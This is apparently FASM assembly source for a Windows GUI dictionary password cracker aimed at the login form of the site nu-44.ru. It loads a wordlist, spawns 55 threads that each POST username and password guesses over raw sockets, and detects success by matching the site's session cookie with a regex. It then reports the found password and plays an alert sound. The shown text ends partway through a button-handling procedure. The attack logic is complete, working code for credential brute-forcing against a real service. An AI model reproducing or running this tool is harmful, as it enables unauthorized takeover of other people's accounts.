format pe gui 4.0
include '%fasm_inc%\win32ax.inc'
include 'regexp\ctypedef.inc'
include 'regexp\AsmRegEx.inc'

DEBUG = 0

AW_VER_POSITIVE = 4
IPPROTO_TCP = 0
INVALID_SOCKET = -1

THREADS = 55

HTCAPTION = 2

green = 32CD32h
red   = 0FFh

AW_HIDE     EQU 10000h
AW_CENTER   EQU 10h

ID_ICON = 17

WM_SHELLNOTIFY equ WM_USER+5

struct GdiplusStartupInput
    GdiplusVersion dd ?
    DebugEventCallback dd ?
    SuppressBackgroundThread dd ?
    SuppressExternalCodecs dd ?
ends

NIIF_NONE = 0
NIIF_INFO = 1
NIIF_WARNING = 2
NIIF_ERROR = 3

struct _NOTIFYICONDATA ;SHELL v5
  cbSize	   dd ?
  hWnd		   dd ?
  uID		   dd ?
  uFlags	   dd ?
  uCallbackMessage dd ?
  hIcon 	   dd ?
  szTip 	   TCHAR 128 dup (?)
  dwState	   dd ?
  dwStateMask	   dd ?
  szInfo	   TCHAR 256 dup (?)
  uTimeout	   dd ?
  szInfoTitle	   TCHAR 64 dup (?)
  dwInfoFlags	   dd ?
ends

IDM_MINIMIZE = 1
IDM_EXIT = 2
IDI_TRAY = 0

.data
include 'regexp\AsmRegEr.inc'
include 'regexp\ctypemap.inc'

; Ресурсы
data resource from 'resource.res'
end data

nuclearalert FILE 'nuclear_alert\Nuclear_Alert.wav'
playsnd db ?

regex	  REGEX_T
http1	  db  'POST /login HTTP/1.1',13,10,\
	      'Connection: keep-alive',13,10,\
	      'Content-Type: application/x-www-form-urlencoded',13,10,\
	      'Content-Length: %u',13,10,\
	      'Host: nu-44.ru',13,10,13,10,\
	      'rusername=%s&rpassword=%s',0
host	  db  'nu-44.ru',0
pattern1  db 'nu44=[A-Za-z0-9%]+;',0
dic rb 512
dicname dd ?
username1 rb 257
username rb 257
getdic db 0
passbuff rb 64
passcount dd 0

; Элементы скина
mainskin FILE 'main.png'
sizemainskin = $-mainskin
editskin FILE 'edit.png'
sizeeditskin = $-editskin
titleskin FILE 'title.png'
sizetitleskin = $-titleskin
button1skin FILE 'button1.png'
sizebutton1skin = $-button1skin
button2skin FILE 'button2.png'
sizebutton2skin = $-button2skin
button3skin FILE 'button3.png'
sizebutton3skin = $-button3skin

txtbutton1 db 'Закрыть',0
txtbutton2 db 'Свернуть',0
txtbutton3 db 'Словарь',0
txtbutton4 db 'Старт',0
txtbutton5 db 'Стоп',0

str1 db 'Главное окно',0
str2 db 'Выход',0

; Класс главного окна
wclass_name db 'nu-44.ru PRM',0
wc WNDCLASS CS_NOCLOSE,windowproc,0,0,0,0,0,0,0,wclass_name

msg MSG
oldwprocedit dd ?
oldwprocbutton dd ?

; skin
gdiplusSInput GdiplusStartupInput 1,0,0,0
gdiplusToken dd ?
bmpMain dd ?
bmpEdit dd ?
bmpButton1 dd ?
bmpButton2 dd ?
bmpButton3 dd ?
bmpTitle dd ?

hbrEdit dd ?

; Дочерние окна
hLogin dd ?
hPass dd ?
hDic dd ?
hClose dd ?
hMinimize dd ?
hStart dd ?
hOpenDic dd ?

btn1mouse dd ?
btn2mouse dd ?
btn3mouse dd ?
btn4mouse dd ?

start_rec dd ?
progress dd 0

color dd green

ps PAINTSTRUCT
back_buffer_dc dd ?
back_buffer_bitmap dd ?

notes _NOTIFYICONDATA
hMenu dd ?
tray_flag dd ?
TaskbarCreated dd ?
pt POINT

ofn OPENFILENAME sizeof.OPENFILENAME,0,0,ofnfilter,0,0,0,dic,512,0,0,0,wclass_name,OFN_HIDEREADONLY
ofnfilter db 'dic',0,'*.txt;*.dic',0,'all',0,'*',0,0

hMutex dd ?
threads dd 0
threads1 dd 0
statbrut dd 0
Array dd ?
arrcn dd ?
WordCount dd ?
_100 dd 100
ip dd ?
wsa WSADATA

.code
start:
	invoke WSAStartup,0101h,wsa
	test eax,eax
	jne exit1
	invoke GdiplusStartup,gdiplusToken,gdiplusSInput,0
	stdcall GdiLoad,mainskin,sizemainskin,bmpMain
	test eax,eax
	je exit
	stdcall GdiLoad,editskin,sizeeditskin,bmpEdit,0
	test eax,eax
	je exit
	stdcall GdiLoad,titleskin,sizetitleskin,bmpTitle,0
	test eax,eax
	je exit
	stdcall GdiLoad,button1skin,sizebutton1skin,bmpButton1,060606h
	test eax,eax
	je exit
	stdcall GdiLoad,button2skin,sizebutton2skin,bmpButton2,060606h
	test eax,eax
	je exit
	stdcall GdiLoad,button3skin,sizebutton3skin,bmpButton3,060606h
	test eax,eax
	je exit
	invoke GetModuleHandleA,0
	mov [wc.hInstance],eax
	invoke LoadCursor,0,IDC_ARROW
	mov [wc.hCursor],eax
	invoke RegisterClassA,wc
	test eax,eax
	je exit
	invoke GetSystemMetrics,SM_CXSCREEN
	sub eax,600
	shr eax,1
	mov esi,eax
	invoke GetSystemMetrics,SM_CYSCREEN
	sub eax,300
	shr eax,1
	invoke CreateWindowExA,WS_EX_ACCEPTFILES + WS_EX_TOPMOST + WS_EX_TOOLWINDOW,wclass_name,0,DS_SETFOREGROUND + WS_VISIBLE + WS_POPUP + WS_CLIPCHILDREN,esi,eax,600,300,HWND_DESKTOP,0,[wc.hInstance],0
	test eax,eax
	je exit
	mov [ofn.hwndOwner],eax
	mov esi,eax
	invoke CreateWindowExA,0,'EDIT','nops',ES_CENTER + WS_CHILD + WS_VISIBLE,119,60,264,22,esi,0,[wc.hInstance],0
	mov [hLogin],eax
	invoke CreateWindowExA,0,'EDIT',0,ES_CENTER + WS_CHILD + WS_VISIBLE,119,105,264,22,esi,0,[wc.hInstance],0
	mov [hPass],eax
	invoke SetWindowLong,eax,GWL_WNDPROC,WProcEdit
	mov [oldwprocedit],eax
	invoke CreateWindowExA,0,'EDIT',0,ES_CENTER + WS_CHILD + WS_VISIBLE,119,151,264,22,esi,0,[wc.hInstance],0
	mov [hDic],eax
	invoke SetWindowLong,eax,GWL_WNDPROC,WProcEdit
	invoke CreateWindowExA,0,'BUTTON',0,BS_BITMAP + BS_FLAT + WS_CHILD + WS_VISIBLE + BS_OWNERDRAW + WS_CLIPSIBLINGS,441,59,143,24,esi,0,[wc.hInstance],0
	mov [hClose],eax
	invoke SetWindowLong,eax,GWL_WNDPROC,WProcButton
	mov [oldwprocbutton],eax
	stdcall CreateRgnFromBitmap,[bmpButton1],060606h
	push eax
	invoke SetWindowRgn,[hClose],eax,1
	invoke DeleteObject
	invoke CreateWindowExA,0,'BUTTON',0,BS_BITMAP + BS_FLAT + WS_CHILD + WS_VISIBLE + BS_OWNERDRAW + WS_CLIPSIBLINGS,441,104,143,24,esi,0,[wc.hInstance],0
	mov [hMinimize],eax
	invoke SetWindowLong,eax,GWL_WNDPROC,WProcButton
	stdcall CreateRgnFromBitmap,[bmpButton1],060606h
	push eax
	invoke SetWindowRgn,[hMinimize],eax,1
	invoke DeleteObject
	invoke CreateWindowExA,0,'BUTTON',0,BS_BITMAP + BS_FLAT + WS_CHILD + WS_VISIBLE + BS_OWNERDRAW + WS_CLIPSIBLINGS,441,150,143,24,esi,0,[wc.hInstance],0
	mov [hOpenDic],eax
	invoke SetWindowLong,eax,GWL_WNDPROC,WProcButton
	stdcall CreateRgnFromBitmap,[bmpButton1],060606h
	push eax
	invoke SetWindowRgn,[hOpenDic],eax,1
	invoke DeleteObject
	invoke CreateWindowExA,0,'BUTTON',0,BS_BITMAP + BS_FLAT + WS_CHILD + WS_VISIBLE + BS_OWNERDRAW + WS_CLIPSIBLINGS,441,219,143,24,esi,0,[wc.hInstance],0
	mov [hStart],eax
	invoke SetWindowLong,eax,GWL_WNDPROC,WProcButton
	stdcall CreateRgnFromBitmap,[bmpButton1],060606h
	push eax
	invoke SetWindowRgn,[hStart],eax,1
	invoke DeleteObject
	invoke CreatePatternBrush,[bmpEdit]
	mov [hbrEdit],eax
	invoke UpdateWindow,esi
	invoke SetFocus,[hLogin]
	invoke CreatePopupMenu
	mov [hMenu],eax
	invoke AppendMenu,[hMenu],MF_STRING,IDM_MINIMIZE,str1
	invoke AppendMenu,[hMenu],MF_STRING,IDM_EXIT,str2
	invoke RegisterWindowMessage,"TaskbarCreated"
	mov [TaskbarCreated],eax
	stdcall regcomp,regex,pattern1;(REGEX_T *regex_t, char *pattern)
	invoke CreateMutexA,0,0,0
	mov [hMutex],eax
	@@:
	invoke GetMessage,msg,0,0,0
	test eax,eax
	je exit
	invoke TranslateMessage,msg
	invoke DispatchMessage,msg
	loop @b
       exit:
	invoke WSACleanup
	invoke GdiplusShutdown,[gdiplusToken]
       exit1:
	invoke ExitProcess,0

proc windowproc hwnd,msg,wparam,lparam
	.if [msg]=WM_DESTROY
		invoke PostQuitMessage,0
		jmp .finish
	.elseif [msg]=WM_DROPFILES
		invoke DragQueryFile,[wparam],0,dic,512
		invoke DragFinish,[wparam]
		mov [getdic],1
		invoke lstrlenA,dic
		add eax,dic
		@@:
		dec eax
		cmp byte [eax-1],'\'
		jne .m2
		mov [dicname],eax
		invoke SetWindowTextA,[hDic],eax
		jmp .finish
	.elseif [msg]=WM_LBUTTONDOWN
		invoke ReleaseCapture
		invoke SendMessageA,[hwnd],WM_NCLBUTTONDOWN,HTCAPTION,0
		jmp .finish
	.elseif [msg]=WM_CTLCOLOREDIT
		mov eax,[lparam]
		cmp eax,[hPass]
		jne @f
		invoke SetTextColor,[wparam],[color]
		@@:
		invoke SetBkMode,[wparam],TRANSPARENT
		mov eax,[hbrEdit]
		jmp .finish
	.elseif [msg]=WM_ERASEBKGND
		xor eax,eax
		jmp .finish
	.elseif [msg]=WM_PRINTCLIENT
		invoke CreateCompatibleDC,[wparam]
		mov edi,eax
		invoke SelectObject,eax,[bmpMain]
		invoke BitBlt,[wparam],0,0,600,300,edi,0,0,SRCCOPY
		invoke DeleteDC,edi
		jmp .finish
	.elseif [msg]=WM_PAINT
		.if [start_rec]=1
				invoke BeginPaint,[hwnd],ps
				mov esi,eax
				invoke CreateCompatibleDC,eax
				mov edi,eax
				invoke SelectObject,edi,[bmpMain]
				invoke BitBlt,[back_buffer_dc],0,0,600,300,esi,0,0,SRCCOPY
				invoke BitBlt,[back_buffer_dc],[ps.rcPaint.left],[ps.rcPaint.top],[ps.rcPaint.right],[ps.rcPaint.bottom],edi,[ps.rcPaint.left],[ps.rcPaint.top],SRCCOPY
				invoke SelectObject,edi,[bmpTitle]
				invoke BitBlt,[back_buffer_dc],0,0,600,23,edi,0,0,SRCCOPY
				invoke SelectObject,edi,[bmpMain]
				mov eax,[progress]
				mov ecx,6
				mul ecx
				invoke BitBlt,[back_buffer_dc],0,0,eax,23,edi,0,0,SRCCOPY
				invoke BitBlt,esi,0,0,600,300,[back_buffer_dc],0,0,SRCCOPY
				invoke DeleteDC,edi
				invoke EndPaint,[hwnd],ps
		.else
				invoke BeginPaint,[hwnd],ps
				mov esi,eax
				invoke CreateCompatibleDC,eax
				mov edi,eax
				invoke SelectObject,edi,[bmpMain]
				invoke BitBlt,esi,[ps.rcPaint.left],[ps.rcPaint.top],[ps.rcPaint.right],[ps.rcPaint.bottom],edi,[ps.rcPaint.left],[ps.rcPaint.top],SRCCOPY
				invoke DeleteDC,edi
				invoke EndPaint,[hwnd],ps
		.endif
		jmp .finish
	.elseif [msg]=WM_DRAWITEM
		mov esi,[lparam]
		invoke CreateCompatibleDC,[esi+DRAWITEMSTRUCT.hDC]
		mov edi,eax
		mov ebx,[esi+DRAWITEMSTRUCT.hwndItem]
		.if ebx=[hClose] | ebx=[hMinimize] | ebx=[hOpenDic] | ebx=[hStart]
			test [esi+DRAWITEMSTRUCT.itemState],ODS_SELECTED
			je @f
			push [bmpButton2]
			jmp .m1
			@@:
			.if ebx=[hClose]
				mov ecx,btn1mouse
			.elseif ebx=[hMinimize]
				mov ecx,btn2mouse
			.elseif ebx=[hOpenDic]
				mov ecx,btn3mouse
			.elseif ebx=[hStart]
				mov ecx,btn4mouse
			.endif
			.if dword [ecx]=0
				push [bmpButton1]
			.elseif
				push [bmpButton3]
			.endif
		.else
			jmp .finish
		.endif
		.m1:
		invoke SelectObject,eax
		invoke BitBlt,[esi+DRAWITEMSTRUCT.hDC],0,0,[esi+DRAWITEMSTRUCT.rcItem.right],[esi+DRAWITEMSTRUCT.rcItem.bottom],edi,0,0,SRCCOPY
		invoke DeleteDC,edi
		invoke SetBkMode,[esi+DRAWITEMSTRUCT.hDC],TRANSPARENT
		lea eax,[esi+DRAWITEMSTRUCT.rcItem]
		push DT_CENTER + DT_VCENTER + DT_SINGLELINE
		push eax
		push -1
		.if ebx=[hClose]
			push txtbutton1
		.elseif [hMinimize]=ebx
			push txtbutton2
		.elseif [hOpenDic]=ebx
			push txtbutton3
		.elseif [hStart]=ebx
			.if [start_rec]=0
				push txtbutton4
			.else
				push txtbutton5
			.endif
		.endif
		invoke DrawTextA,[esi+DRAWITEMSTRUCT.hDC]
		jmp .finish
	.elseif [msg]=WM_COMMAND
		mov eax,[lparam]
		.if eax=[hClose]
		       .wmclose:
			invoke AnimateWindow,[hClose],100,AW_VER_POSITIVE + AW_HIDE
			invoke AnimateWindow,[hMinimize],100,AW_VER_POSITIVE + AW_HIDE
			invoke AnimateWindow,[hOpenDic],100,AW_VER_POSITIVE + AW_HIDE
			invoke AnimateWindow,[hStart],100,AW_VER_POSITIVE + AW_HIDE
			invoke AnimateWindow,[hwnd],1000,AW_CENTER + AW_HIDE
			invoke CloseHandle,[hMutex]
			invoke DeleteObject,[hbrEdit]
			invoke DeleteObject,[bmpButton1]
			invoke DeleteObject,[bmpButton2]
			invoke DeleteObject,[bmpButton3]
			invoke DeleteObject,[bmpEdit]
			invoke DeleteObject,[bmpMain]
			invoke SendMessageA,[hwnd],WM_DESTROY,0,0
		.elseif eax=[hStart] & [start_rec]=0
			invoke SetWindowTextA,[hPass],0
			.if [getdic]=0
				invoke SetWindowTextA,[hDic],'Выберите словарь.'
				jmp .finish
			.endif
			invoke GetWindowTextLengthA,[hLogin]
			.if eax<34 & eax<>0
				mov [start_rec],1
				mov [statbrut],0
				invoke GetWindowTextW,[hLogin],username,eax
				invoke WideCharToMultiByte,CP_UTF8,0,username,-1,username1,256,0,0
				stdcall urlencode,username1,username,256
				invoke CreateThread,0,0,DicAnalys,[hwnd],0,0
				invoke CreateThread,0,0,progressbrut,[hwnd],0,0
			.else
				invoke SetWindowTextA,[hLogin],'nops'
			.endif
		.elseif eax=[hStart]
			mov [start_rec],-1
		.elseif eax=[hMinimize]
		   .wmsize_tray:
			mov [tray_flag],1
			mov [notes.cbSize],sizeof._NOTIFYICONDATA
			push [hwnd]
			pop [notes.hWnd]
			mov [notes.uID],IDI_TRAY
			mov [notes.uFlags],NIF_ICON+NIF_MESSAGE+NIF_TIP
			mov [notes.uCallbackMessage],WM_SHELLNOTIFY
			invoke LoadIconA,[wc.hInstance],ID_ICON
			mov [notes.hIcon],eax
			invoke lstrcpy,notes.szTip,'Nu-44.ru PRM'
			invoke ShowWindow,[hwnd],SW_HIDE
			invoke Shell_NotifyIconA,NIM_ADD,notes
		.elseif eax=[hOpenDic]
			invoke GetOpenFileName,ofn
			test eax,eax
			je @f
			mov [getdic],1
			invoke lstrlenA,dic
			add eax,dic
			.m2:
			dec eax
			cmp byte [eax-1],'\'
			jne .m2
			mov [dicname],eax
			invoke SetWindowTextA,[hDic],eax
			@@:
		.elseif eax=0
			mov eax,[wparam]
			.if ax=IDM_MINIMIZE
				@@:
				invoke ShowWindow,[hwnd],SW_SHOWDEFAULT
				invoke SetActiveWindow,[hwnd]
				invoke Shell_NotifyIcon,NIM_DELETE,notes
				jmp .finish
			.elseif ax=IDM_EXIT
				.if [start_rec]=1
					jmp @b
				.endif
				invoke Shell_NotifyIcon,NIM_DELETE,notes
				jmp .wmclose
			.else
				invoke DestroyWindow,[hwnd]
			.endif
			invoke Shell_NotifyIcon,NIM_DELETE,notes
		.endif
		jmp .finish
	.elseif [msg]=WM_SHELLNOTIFY
		.if [wparam]=IDI_TRAY
			.if [lparam]=WM_LBUTTONDBLCLK
				mov [tray_flag],0
				invoke SendMessage,[hwnd],WM_COMMAND,IDM_MINIMIZE,0
			.elseif [lparam]=WM_RBUTTONDOWN
				invoke GetCursorPos,pt
				invoke SetForegroundWindow,[hwnd]
				invoke TrackPopupMenu,[hMenu],TPM_RIGHTALIGN,[pt.x],[pt.y],NULL,[hwnd],NULL
				invoke PostMessageA,[hwnd],WM_NULL,0,0
			.endif
		.endif
		jmp .finish
	.else
		mov eax,[TaskbarCreated]
		.if [msg]=eax & [tray_flag]=1
			jmp .wmsize_tray
		.endif
	.endif
	invoke DefWindowProc,[hwnd],[msg],[wparam],[lparam]
      .finish:
	ret
endp

proc DicAnalys hwnd
	local hFile:DWORD
	local memdic:DWORD
	local pcent:DWORD
	if DEBUG=1
		local slovar:DWORD
		local perebor:DWORD

		invoke GetTickCount
		mov [slovar],eax
	end if

	invoke gethostbyname,host
	.if eax=0
		mov [color],red
		invoke SetWindowTextA,[hPass],'Не удалось получить IP адрес'
		jmp .exit0
	.endif
	mov eax,[eax+hostent.h_addr_list]
	mov eax,[eax]
	mov eax,[eax]
	mov [ip],eax

	invoke EnableWindow,[hOpenDic],0
	invoke SetWindowLong,[hLogin],GWL_WNDPROC,WProcEdit
	invoke SetWindowTextA,[hDic],'Анализ словаря...'
	mov [WordCount],0
	invoke GlobalAlloc,GPTR,5000000
	test eax,eax
	je .exit0
	mov [Array],eax
	invoke _lopen,dic,OF_READ
	.if eax=-1
		invoke SetWindowTextA,[hDic],'Не удаётся открыть файл...'
		mov [getdic],0
		jmp .exit
	.endif
	mov [hFile],eax
	invoke GetFileSize,eax,0
	.if eax=0 | eax>=4*1024*1024*1024-1
		invoke SetWindowTextA,[hDic],'Слишком большой словарь...'
		mov [getdic],0
		jmp .exit1
	.endif
	mov esi,eax
	inc eax
	invoke GlobalAlloc,GPTR,eax
	.if eax=0
		invoke SetWindowTextA,[hDic],'Не удаётся выделить память...'
		jmp .exit1
	.endif
	mov [memdic],eax
	invoke _lread,[hFile],eax,esi
	.if eax=-1
		invoke SetWindowTextA,[hDic],'Не удаётся прочитать словарь...'
		jmp .exit1
	.endif
	mov eax,esi
	mov ecx,100
	xor edx,edx
	div ecx
	mov [pcent],eax
	xor ecx,ecx
	mov edi,[Array]
	mov ebx,[memdic]
       .m1:
	.if byte [ebx]<>0 & word [ebx]<>0A0Dh & byte [ebx]<>0Ah
		mov eax,[WordCount]
		lea eax,[eax*4]
		mov [edi+eax],ebx
		inc [WordCount]
		inc ecx
		inc ebx
	.endif
       .m2:
	.if byte [ebx]=0
		jmp .m3
	;.elseif [WordCount]=5000000/4
	.elseif [start_rec]=-1
		invoke SetWindowTextA,[hDic],[dicname]
		jmp .exit2
	.elseif word [ebx]=0A0Dh
		mov word [ebx],0
		add ecx,2
		add ebx,2
		xor edx,edx
		mov eax,ecx
		mov esi,[pcent]
		.if esi<>0
			div esi
		.else
			mov eax,0
		.endif
		mov [progress],eax
		jmp .m1
	.elseif byte  [ebx]=0Ah
		mov byte [ebx],0
		inc ecx
		inc ebx
		xor edx,edx
		mov eax,ecx
		mov esi,[pcent]
		.if esi<>0
			div esi
		.else
			mov eax,0
		.endif
		mov [progress],eax
		jmp .m1
	.else
		inc ebx
		inc ecx
		jmp .m2
	.endif
	.m3:
	if DEBUG=1
		invoke GetTickCount
		sub eax,[slovar]
		mov [slovar],eax
	end if
	invoke SetWindowTextA,[hDic],[dicname]
	mov [progress],0
	mov [color],0
	invoke SetWindowTextA,[hPass],'Перебор...'

	mov eax,[WordCount]
	xor edx,edx
	mov ecx,THREADS
	div ecx
	.if eax=0
		mov ecx,1
		mov [arrcn],0
	.else
		mov ecx,THREADS
		mov [arrcn],eax
	.endif

	if DEBUG=1
		invoke GetTickCount
		mov [perebor],eax
	end if

	; Далее создание потоков
	@@:
	push ecx
	invoke CreateThread,0,0,brut1,ecx,0,0
	pop ecx
	loop @b
	invoke WaitForSingleObject,eax,-1
	.if [statbrut]=1
		mov [color],green
		invoke SetWindowTextA,[hPass],passbuff
		SND_ASYNC = 1
		SND_MEMORY = 4
		cmp [playsnd],1
		jne @f
		invoke PlaySoundA,nuclearalert,[wc.hInstance],SND_ASYNC+SND_MEMORY
		@@:
	.elseif [start_rec]=-1
		mov [color],red
		invoke SetWindowTextA,[hPass],'Перебор отменён...'
	.else
		mov [color],red
		invoke SetWindowTextA,[hPass],'В словаре нет пароля...'
	.endif
	.if [tray_flag]=1
		invoke RtlZeroMemory,notes,sizeof._NOTIFYICONDATA
		mov [notes.cbSize],sizeof._NOTIFYICONDATA
		push [hwnd]
		pop [notes.hWnd]
		mov [notes.uID],IDI_TRAY
		.if [statbrut]=1
			pushd 'Пароль подобран!'
		.elseif [start_rec]<>-1
			pushd 'Перебор окончен'
		.endif
		invoke lstrcpyA,notes.szInfo
		mov [notes.uTimeout],0
		mov [notes.dwInfoFlags],NIIF_INFO
		mov [notes.uFlags],NIF_INFO
		invoke Shell_NotifyIcon,NIM_MODIFY,notes
	.endif
	if DEBUG=1
		invoke GetTickCount
		sub eax,[perebor]
		.if [arrcn]=0
			mov ecx,1
		.else
			mov ecx,THREADS
		.endif
		cinvoke wsprintfA,username1,'Потоков: %u. Слов: %u. Анализ: %u. Перебор %u.',ecx,[WordCount],[slovar],eax
		invoke MessageBoxA,0,username1,0,0
	end if
      .exit2:
	invoke GlobalFree,[memdic]
      .exit1:
	invoke _lclose,[hFile]
      .exit:
	invoke GlobalFree,[Array]
      .exit0:
	invoke SetWindowLong,[hLogin],GWL_WNDPROC,[oldwprocedit]
	mov [start_rec],0
	mov [progress],0
	mov [passcount],0
	mov [playsnd],0
	invoke InvalidateRect,[hwnd],0,0
	invoke InvalidateRect,[hStart],0,0
	invoke EnableWindow,[hOpenDic],1
	invoke ReleaseMutex,[hMutex]
	invoke ExitThread,0
endp

proc brut1 arg
	local arr:DWORD

	@@:
	invoke WaitForSingleObject,[hMutex],-1
	.if eax=WAIT_OBJECT_0
		invoke InterlockedExchangeAdd,threads,1
		inc [threads1]
		mov eax,[threads1]
		dec eax
		mov ecx,[arrcn]
		mul ecx
		lea eax,[eax*4]
		add eax,[Array]
		mov [arr],eax
		invoke ReleaseMutex,[hMutex]
	.else
		jmp @b
	.endif
	mov ecx,[arrcn]
	.m1:
	push ecx
	.m2:
	invoke InterlockedExchangeAdd,passcount,1
	mov eax,[arr]
	stdcall brut,dword [eax]
	.if eax=1 | eax=-1
		mov [statbrut],1
		.if eax=-1
			push .errbrut
			mov [color],red
		.else
			mov eax,[arr]
			push dword [eax]
		.endif
		invoke lstrcpyA,passbuff
		jmp .exit
	.elseif [start_rec]=-1
		jmp .exit
	.elseif [statbrut]=1
		jmp .exit
	.endif
	add [arr],4
	.if [arg]<>1
		pop ecx
		loop .m1
	.else
		cmp [progress],100
		je .exit
		jmp .m2
	.endif
      .exit:
	invoke InterlockedExchangeAdd,threads,-1
	.if [arg]=1
		@@:
		.if [threads]<>0
			invoke Sleep,1
			jmp @b
		.endif
		mov [threads1],0
	.endif
	invoke ExitThread,0
	.errbrut db 'Код статуса != 200 & != 302',0
endp

proc brut pass
	local buff:DWORD
	local hSock:DWORD
	local sin:sockaddr_in
	local buffer:DWORD

	mov [buff],0
	invoke socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
	cmp eax,INVALID_SOCKET
	je .exit
	mov [hSock],eax
	mov [sin.sin_family],AF_INET
	mov eax,[ip]
	mov [sin.sin_addr],eax
	invoke htons,80
	mov [sin.sin_port],ax
	lea eax,[sin]
	invoke connect,[hSock],eax,sizeof.sockaddr_in
	test eax,eax
	jne .exit1
	invoke lstrlenA,username
	mov esi,eax
	invoke lstrlenA,[pass]
	add esi,eax
	add esi,21
	invoke GlobalAlloc,GPTR,5000000
	mov [buffer],eax
	invoke GlobalAlloc,GPTR,512
	mov edi,eax
	invoke MultiByteToWideChar,0,0,[pass],-1,edi,512
	invoke WideCharToMultiByte,CP_UTF8,0,edi,-1,[buffer],512,0,0
	push esi
	push edi
	stdcall urlencode,[buffer],edi,512
	pop edi
	pop esi
	push edi
	cinvoke wsprintfA,[buffer],http1,esi,username,edi
	invoke GlobalFree
	invoke lstrlenA,[buffer]
	invoke send,[hSock],[buffer],eax,0
	invoke recv,[hSock],[buffer],1024,0
	stdcall regexec,regex,[buffer];(REGEX_T *regex_t, char *string)
	.if eax<>REGEX_NOMATCH
		mov [playsnd],1
	.else
		mov eax,[buffer]
		.if dword [eax+8]<>' 200' & dword [eax+8]<>' 302'
			mov [playsnd],-1
		.endif
	.endif
	SD_BOTH = 2
	invoke shutdown,[hSock],SD_BOTH
	invoke GlobalFree,[buffer]
      .exit1:
	invoke closesocket,[hSock]
      .exit:
	xor eax,eax
	.if [playsnd]=1
		inc eax
	.elseif [playsnd]=-1
		dec eax
	.endif
	ret
endp

proc urlencode text_to_convert,result_buffer,result_buffer_len
	push esi
	push edi
	push ebx
 
	mov esi,[result_buffer]
	mov edi,[text_to_convert]

    .loop_enc:
	mov eax,esi
	sub eax,[result_buffer]
	mov ebx,[result_buffer_len]
	sub ebx,4
	.if eax>=ebx
		jmp .loop_enc_end
	.endif
 
	mov al,byte [edi]
 
	.if al<80h
		.if al=' '
			mov byte [esi],'+'
			inc esi
		.elseif ((al>0 & al<=47) | (al>=58 & al<=64) | (al>=91 & al<=96) | al>=123) & al<>'.' & al<>'_' & al<>'-'
			movzx eax,al
			invoke wsprintf,esi,"%%%02X",eax
			add esi,3
		.else
			mov byte [esi],al
			inc esi
		.endif
	.else
		movzx eax,al
		invoke wsprintf,esi,"%%%02X",eax
		add esi,3
	.endif
 
	inc edi
	mov bl,byte [edi]
	test bl,bl
	jne .loop_enc
 
     .loop_enc_end:
 
	mov byte [esi],0
	pop ebx
	pop edi
	pop esi
	ret
endp

proc progressbrut hwnd
	local num:DWORD
	local dc:DWORD

	mov [num],-1
	invoke GetDC,[hwnd]
	push eax
	push 300
	push 600
	push eax
	invoke CreateCompatibleDC,eax
	mov [back_buffer_dc],eax
	invoke CreateCompatibleBitmap;[dc],600,300
	mov [back_buffer_bitmap],eax
	invoke SelectObject,[back_buffer_dc],[back_buffer_bitmap]
	invoke ReleaseDC,[hwnd]
	@@:
	.if [start_rec]=1
		 mov eax,[passcount]
		 .if eax<>[num]
			 mov [num],eax
			 finit
			 fild [_100]
			 fild [WordCount]
			 fdiv st,st1
			 fild [passcount]
			 fdiv st,st1
			 fisttp [progress]
			 invoke InvalidateRect,[hwnd],0,0
		 .endif
	.else
		invoke DeleteObject,[back_buffer_bitmap]
		invoke DeleteDC,[back_buffer_dc]
	     ;   invoke InvalidateRect,[hwnd],0,0
		invoke ExitThread,0
	.endif
	invoke Sleep,1
	jmp @b
endp

proc GdiLoad mem,size,hbitmap,alpha
	local pIStream:DWORD
	local hIStream:DWORD
	local mem2:DWORD
	local pmem2:DWORD
	local image:DWORD

	invoke GlobalAlloc,GMEM_MOVEABLE,[size]
	test eax,eax
	je .exit0
	mov [mem2],eax
	invoke GlobalLock,eax
	mov [pmem2],eax
	invoke RtlMoveMemory,eax,[mem],[size]
	lea eax,[pIStream]
	invoke CreateStreamOnHGlobal,[pmem2],0,eax
	test eax,eax
	jne .exit1
	mov [image],0
	lea eax,[image]
	invoke GdipCreateBitmapFromStream,[pIStream],eax
	lea ecx,[hIStream]
	invoke GetHGlobalFromStream,[pIStream],ecx
	lea eax,[image]
	invoke GdipDisposeImage,eax
	mov eax,[hbitmap]
	invoke GdipCreateHBITMAPFromBitmap,[image],eax,[alpha]
	invoke GlobalUnlock,[pmem2]
	invoke GlobalFree,[mem2]
	mov eax,[image]
	ret
     .exit1:
	invoke GlobalUnlock,[pmem2]
	invoke GlobalFree,[mem2]
     .exit0:
	xor eax,eax
	ret
endp

proc WProcEdit hwnd,msg,wparam,lparam
	mov eax,[hwnd]
	.if eax<>[hLogin]
		invoke HideCaret,[hwnd]
	.endif
	cmp [msg],WM_CUT
	je .finish
	cmp [msg],WM_PASTE
	je .finish
	cmp [msg],WM_KEYDOWN
	je .finish
	.if [msg]=WM_CHAR
		invoke GetKeyState,VK_LCONTROL
		test ax,8000h
		je .finish
		invoke GetKeyState,43h ; C
		test ax,8000h
		je .finish
	.elseif [msg]=WM_PRINTCLIENT
		invoke GetDC,[hwnd]
		mov edi,eax
		invoke BitBlt,[wparam],0,0,600,300,edi,0,0,SRCCOPY
		invoke ReleaseDC,[hwnd],esi
		jmp .finish
	.endif
	mov eax,[hwnd]
	.if eax<>[hLogin] | [start_rec]<>0
		.if eax=[hPass] & [statbrut]=1
			jmp @f
		.endif
		cmp [msg],WM_RBUTTONDOWN
		je .finish
		cmp [msg],WM_LBUTTONDOWN
		je .move
		cmp [msg],WM_SETCURSOR
		je .finish
	.endif
	@@:
	invoke CallWindowProc,[oldwprocedit],[hwnd],[msg],[wparam],[lparam]
	ret
     .move:
	SC_DRAGMOVE = 0F012h
	invoke SendMessageA,[ofn.hwndOwner],WM_SYSCOMMAND,SC_DRAGMOVE,0,0
     .finish:
	xor eax,eax
	ret
endp

proc WProcButton hwnd,msg,wparam,lparam
	local rect:RECT

	cmp [msg],WM_ERASEBKGND
	je .finish
	.if [msg]=WM_MOUSEMOVE & [wparam]<>MK_LBUTTON
		lea eax,[rect]
		invoke GetWindowRect,[hwnd],eax
		mov eax,[rect.right] ; X
		sub eax,[rect.left]  ; X
		mov ecx,[rect.bottom]; Y
		sub ecx,[rect.top]   ; Y
		movsx edi,word [lparam] ;X
		movsx esi,word [lparam+2] ;Y
		.if esi>ecx | esi<0 | edi>eax | edi<0
			mov eax,[hwnd]
			.if eax=[hClose]
				mov eax,[btn1mouse]
			.elseif eax=[hMinimize]
				mov eax,[btn2mouse]
			.elseif eax=[hOpenDic]
				mov eax,[btn3mouse]
			.elseif eax=[hStart]
